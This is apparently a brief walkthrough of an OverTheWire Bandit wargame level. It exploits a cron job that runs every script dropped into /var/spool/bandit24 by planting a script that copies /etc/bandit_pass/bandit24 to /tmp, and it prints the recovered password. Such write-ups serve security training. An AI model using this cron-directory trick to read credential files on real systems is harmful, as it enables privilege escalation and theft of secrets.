Similar to last level. Let's read the script.

bandit23@bandit:~$ cd /etc/cron.d/
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  popularity-contest
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24 
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 ./$i
	rm -f ./$i
    fi
done



Alright. First things first, let's go to where the script is executing all
scripts.

bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24/

Now let's make a script.

bandit23@bandit:/etc/cron.d$ vim Ugohpei2.sh
#!/bin/bash
touch /tmp/iSheich6
cat /etc/bandit_pass/bandit24 > /tmp/iSheich6

And run it and read it.
bandit23@bandit:/var/spool/bandit24$ /usr/bin/cronjob_bandit24.sh
-snip-
bandit23@bandit:/var/spool/bandit24$ cat /tmp/iSheich6
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
